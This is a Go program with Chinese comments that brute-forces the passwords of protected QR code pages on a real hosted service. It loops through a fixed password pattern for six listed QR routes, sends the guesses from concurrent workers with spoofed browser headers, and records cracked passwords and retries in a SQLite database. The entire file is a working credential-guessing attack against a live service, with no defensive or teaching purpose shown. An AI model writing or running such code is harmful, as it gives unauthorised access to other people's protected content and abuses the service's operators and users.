package main

import (
	"bytes"
	"database/sql"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	_ "github.com/mattn/go-sqlite3"
)

// 二维码地址列表
var qrCodes = []string{
	"https://qr71.cn/orHY8H/qLhqfi1",
	"https://qr71.cn/orHY8H/qwGKfdp",
	"https://qr71.cn/orHY8H/q0wPTPN",
	"https://qr71.cn/orHY8H/qdL7RDG",
	"https://qr71.cn/orHY8H/qAWBzGV",
	"https://qr71.cn/orHY8H/qo5MqFe",
	//"https://qr71.cn/orHY8H/q1UWFR4",
}

// 状态常量
const (
	StatusNetworkFailure = iota // 网络失败
	StatusPasswordFailure
	StatusSuccess
)

// HTTP 客户端（超时控制）
var httpClient = &http.Client{Timeout: 10 * time.Second}

// 日志文件
var logFile *os.File
var logger *log.Logger

var targetURL = "https://nc.caoliao.net/qrcoderoute/getQrcodeScanData"

// 初始化日志
func init() {
	dir, _ := os.Getwd()
	fmt.Println("当前执行目录:", dir)

	var err error
	logFile, err = os.OpenFile("./db_errors.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法创建日志文件:", err)
		os.Exit(1)
	}
	logger = log.New(logFile, "", log.LstdFlags)
}

func main() {
	defer logFile.Close()
	InitDB()
	defer DB.Close()

	var wg sync.WaitGroup
	jobs := make(chan string, 100)

	// 启动 5 个 Goroutine 进行破解
	for i := 0; i < 5; i++ {
		wg.Add(1)
		go worker(jobs, &wg)
	}

	// 生成 00000 - 99999 的密码
	for _, qrcode := range qrCodes {
		crackedCh := make(chan bool)
		go func(qr string) {
			crackedCh <- isCracked(qr)
		}(qrcode)

		if <-crackedCh { // **并行检查是否已破解**
			fmt.Printf("✅ 已破解，跳过二维码: %s\n", qrcode)
			continue
		}

		for i := 0; i < 1000; i++ {
			password := fmt.Sprintf("afd%03d", i)
			attemptedCh := make(chan bool)
			go func(qr, pwd string) {
				attemptedCh <- isAttempted(qr, pwd)
			}(qrcode, password)

			if <-attemptedCh { // **并行检查是否已尝试**
				continue
			}

			jobs <- fmt.Sprintf("%s,%s", qrcode, password)
		}
	}

	close(jobs)
	wg.Wait()
}

// 处理密码尝试
func worker(jobs chan string, wg *sync.WaitGroup) {
	defer wg.Done()

	for job := range jobs {
		data := strings.Split(job, ",")
		qrcode, password := data[0], data[1]

		crackedCh := make(chan bool)
		go func(qr string) {
			crackedCh <- isCracked(qr)
		}(qrcode)

		if <-crackedCh { // **并行检查是否已破解**
			continue
		}

		//success, err := tryPassword(qrcode, password)
		success, err := tryPassword2(qrcode, password)
		status := StatusPasswordFailure
		if err != nil {
			status = StatusNetworkFailure
			logDBError(fmt.Sprintf("❌ 网络请求失败: %s - %s - 错误: %v", qrcode, password, err))
		} else if success {
			status = StatusSuccess
			saveCrackedQR(qrcode, password)
			fmt.Printf("✅ 破解成功: %s - %s\n", qrcode, password)
		}

		saveAttempt(qrcode, password, status)
		time.Sleep(500 * time.Millisecond)
	}
}

// 发送 HTTP 请求
func tryPassword(qrcodeRoute, password string) (bool, error) {
	formData := url.Values{}
	formData.Set("qrcode_route", qrcodeRoute)
	formData.Set("password", password)

	req, err := http.NewRequest("POST", targetURL, bytes.NewBufferString(formData.Encode()))
	if err != nil {
		return false, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := httpClient.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, err
	}

	return checkSuccess(body), nil
}

func tryPassword2(qrcodeRoute, password string) (bool, error) {
	url := "https://nc.caoliao.net/qrcoderoute/getQrcodeScanData"
	payload := fmt.Sprintf(`target_data_map=[{"target_type":"qrcode_data","target_params":{"qrcode_route":"%s","password":"%s","render_default_fields":"0","render_component_number":0,"render_edit_btn":"1"}}]&with_markdown=1`, qrcodeRoute, password)

	client := &http.Client{}
	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(payload)))
	if err != nil {
		return false, err
	}

	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("Origin", "https://h5.clewm.net")
	req.Header.Set("Referer", "https://h5.clewm.net/")
	req.Header.Set("Sec-Fetch-Dest", "empty")
	req.Header.Set("Sec-Fetch-Mode", "cors")
	req.Header.Set("Sec-Fetch-Site", "cross-site")
	req.Header.Set("Sec-Fetch-Storage-Access", "active")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36")
	req.Header.Set("sec-ch-ua", `"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"`)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", "macOS")
	req.Header.Set("x-rf", "feature-split-support")

	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, err
	}

	return checkSuccess2(body), nil
}

// 解析 JSON 判断是否成功
func checkSuccess(body []byte) bool {
	var res struct {
		Msg struct {
			Code string `json:"code"`
		} `json:"msg"`
	}

	err := json.Unmarshal(body, &res)
	if err != nil {
		logDBError("解析body失败")
		return false
	}

	return res.Msg.Code == "0"
}

func checkSuccess2(body []byte) bool {
	var res struct {
		Data struct {
			QrcodeData struct {
				Msg struct {
					Code string `json:"code"`
				} `json:"msg"`
			} `json:"qrcode_data"`
		} `json:"data"`
	}

	err := json.Unmarshal(body, &res)
	if err != nil {
		logDBError("解析body失败")
		return false
	}

	return res.Data.QrcodeData.Msg.Code == "0"
}

// 记录已尝试的密码
func saveAttempt(qrRoute, password string, status int) {
	_, err := DB.Exec(`
        INSERT INTO attempts (qrcode_route, password, status, created_at, updated_at) 
        VALUES (?, ?, ?, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP) 
        ON CONFLICT(qrcode_route, password) DO UPDATE 
        SET status = excluded.status, updated_at = CURRENT_TIMESTAMP`,
		qrRoute, password, status)
	if err != nil {
		logDBError(fmt.Sprintf("写入数据库失败 (attempts): %s - %s - Status: %d - 错误: %v", qrRoute, password, status, err))
	}
}

// 记录成功破解的 `qrroute`
func saveCrackedQR(qrRoute, password string) {
	_, err := DB.Exec(`
        INSERT INTO cracked_qr (qrcode_route, password, created_at, updated_at) 
        VALUES (?, ?, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP) 
        ON CONFLICT(qrcode_route) DO UPDATE 
        SET password = excluded.password, updated_at = CURRENT_TIMESTAMP`,
		qrRoute, password)
	if err != nil {
		logDBError(fmt.Sprintf("写入数据库失败 (cracked_qr): %s - %s - 错误: %v", qrRoute, password, err))
	}
}

// 记录数据库错误日志
func logDBError(message string) {
	logMsg := fmt.Sprintf("[%s] %s", time.Now().Format("2006-01-02 15:04:05"), message)
	fmt.Println(logMsg)
	logger.Println(logMsg)
}

// 检查是否已破解成功
func isCracked(qrRoute string) bool {
	var exists string
	err := DB.QueryRow(`SELECT password FROM cracked_qr WHERE qrcode_route = ?`, qrRoute).Scan(&exists)
	return err == nil
}

// 检查是否已尝试过某个密码
func isAttempted(qrRoute, password string) bool {
	var exists string
	err := DB.QueryRow(`SELECT password FROM attempts WHERE qrcode_route = ? AND password = ?`, qrRoute, password).Scan(&exists)
	return err == nil
}

// db

var DB *sql.DB

func InitDB() {
	var err error
	DB, err = sql.Open("sqlite3", "./database.db")
	if err != nil {
		fmt.Println("数据库连接失败:", err)
		return
	}

	createTables()
}

func createTables() {
	queries := []string{
		`CREATE TABLE IF NOT EXISTS attempts (
			qrcode_route TEXT,
			password TEXT,
			status INTEGER,
			created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
			updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
			PRIMARY KEY (qrcode_route, password)
		);`,
		`CREATE TABLE IF NOT EXISTS cracked_qr (
			qrcode_route TEXT PRIMARY KEY,
			password TEXT,
			created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
			updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
		);`,
	}

	for _, query := range queries {
		_, err := DB.Exec(query)
		if err != nil {
			fmt.Println("创建表失败:", err)
		}
	}
}

func retryFailedAttempts() {
	rows, err := DB.Query(`
        SELECT qrcode_route, password FROM attempts WHERE status = ?`, StatusNetworkFailure)
	if err != nil {
		logDBError(fmt.Sprintf("❌ 查询网络失败记录失败: %v", err))
		return
	}
	defer rows.Close()

	var retryList []struct {
		QRRoute  string
		Password string
	}

	// 读取所有网络失败的记录
	for rows.Next() {
		var qrRoute, password string
		if err := rows.Scan(&qrRoute, &password); err != nil {
			logDBError(fmt.Sprintf("❌ 解析查询结果失败: %v", err))
			continue
		}
		retryList = append(retryList, struct {
			QRRoute  string
			Password string
		}{qrRoute, password})
	}

	// 遍历重试
	for _, attempt := range retryList {
		success, err := tryPassword2(attempt.QRRoute, attempt.Password)
		if err != nil {
			// 仍然失败，更新 `updated_at` 以便下次继续重试
			_, _ = DB.Exec(`
                UPDATE attempts SET updated_at = CURRENT_TIMESTAMP WHERE qrcode_route = ? AND password = ?`,
				attempt.QRRoute, attempt.Password)
			logDBError(fmt.Sprintf("❌ 重新请求失败: %s - %s - 错误: %v", attempt.QRRoute, attempt.Password, err))
			continue
		}

		if success {
			// 成功破解，存入 cracked_qr 表，并更新 attempts 的状态为成功
			saveCrackedQR(attempt.QRRoute, attempt.Password)
			_, _ = DB.Exec(`
                UPDATE attempts SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE qrcode_route = ? AND password = ?`,
				StatusSuccess, attempt.QRRoute, attempt.Password)
			fmt.Printf("✅ 重新请求成功: %s - %s\n", attempt.QRRoute, attempt.Password)
		} else {
			// 仍然失败，但不是网络错误，更新 status
			_, _ = DB.Exec(`
                UPDATE attempts SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE qrcode_route = ? AND password = ?`,
				StatusPasswordFailure, attempt.QRRoute, attempt.Password)
		}
	}
}
